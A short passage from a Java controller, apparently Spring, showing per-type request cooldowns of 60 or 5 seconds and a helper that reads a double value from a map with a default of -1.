        if (type.contains("_ALL")) {
            cooldownService.addCooldown(cooldownKey, Duration.ofSeconds(60));
        } else {
            cooldownService.addCooldown(cooldownKey, Duration.ofSeconds(5));
        }

        return ResponseEntity.ok("success");
    }
    //end user-edit

    private double getDoubleValue(Map<String, Object> data, String key) {
        return data.get(key) == null ? -1D : Double.parseDouble(String.valueOf(data.get(key)));
    }
}
